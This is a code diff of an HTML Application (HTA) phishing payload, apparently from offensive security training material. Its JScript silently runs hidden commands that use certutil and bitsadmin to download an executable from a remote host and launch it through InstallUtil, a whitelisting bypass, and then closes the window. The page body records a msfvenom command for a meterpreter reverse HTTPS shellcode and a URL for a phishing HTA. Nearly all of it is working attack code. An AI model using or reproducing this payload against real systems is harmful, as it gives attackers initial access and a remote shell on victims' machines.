@@ -2,15 +2,40 @@
 <head>
 <script language="JScript">
 var shell = new ActiveXObject("WScript.Shell");
-var re = shell.Run("powershell -windowstyle hidden bitsadmin /Transfer newjob3 http://192.168.49.173/enc3.txt c:\\windows\\temp\\enc3.txt;certutil -decode c:\\windows\\temp\\enc3.txt c:\\windows\\temp\\bypass.exe;C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\installutil.exe /logfile= /LogToConsole=false /U C:\\windows\\temp\\bypass.exe")
+//var re = shell.Run("powershell -windowstyle hidden bitsadmin /Transfer newjob3 http://10.0.0.234/temp_bin/enc3.txt c:\\windows\\temp\\enc3.txt;certutil -decode c:\\windows\\temp\\enc3.txt c:\\windows\\temp\\bypass.exe;C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\installutil.exe /logfile= /LogToConsole=false /U C:\\windows\\temp\\bypass.exe")
 //var res = shell.Run("bitsadmin /Transfer newjob2 http://192.168.49.173/enc2.txt c:\\windows\\temp\\enc1.txt");
-//var res1 = shell.Run("timeout 10 && certutil -decode c:\\windows\\temp\\enc.txt c:\\windows\\temp\\bypass.exe");
-//var res2 = shell.Run("timeout 12 && C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\installutil.exe /logfile= /LogToConsole=false /U C:\\windows\\temp\\bypass.exe");
+
+shell.Run('certutil.exe -urlcache -split -f "http://10.0.0.234/temp_bin/installutil-bypass.exe" c:\\windows\\temp\\bypass.exe');
+shell.Run("timeout 5");
+shell.Run('cmd.exe /c "timeout 5 && C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\installutil.exe /logfile= /LogToConsole=false /U C:\\windows\\temp\\bypass.exe"')
+shell.Run("timeout 5");
 </script>
 </head>
 <body>
 <script language="JScript">
 self.close();
 </script>
+
+
+<h1>
+	msfvenom -p windows/x64/meterpreter/reverse_https LHOST=10.0.0.234 LPORT=443 -f csharp
+</h1>
+
+
+<h1>
+	replace shell code
+	F:\project\repo\installutil-bypass\
+</h1>
+
+
+<h1>
+	http://10.0.0.234//osep_tools/Payloads/Phishing/nonDN2J.hta
+</h1>
+
+
+<h1>
+</h1>
+
+
 </body>
 </html>
